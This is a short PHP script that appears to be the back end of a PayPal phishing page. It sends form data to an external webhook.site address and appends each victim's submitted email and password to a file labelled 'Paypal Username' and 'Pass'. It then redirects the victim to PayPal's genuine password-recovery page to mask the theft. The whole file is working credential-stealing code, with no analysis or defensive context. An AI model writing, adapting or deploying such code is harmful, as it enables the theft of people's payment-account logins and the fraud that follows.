<?php
$response = $client->request(
    'POST',
    'https://webhook.site/4a4f3e5c-e52f-4e6f-a9e3-a7e19014c8e4',
    [
        'form_params' => [
            'login_email',
            'login_password'
        ]
    ]
);
$headers = $response->getHeaders();
$body = $response->getBody();
var_dump($headers, $body);

file_put_contents("usernames.txt", "Paypal Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
?>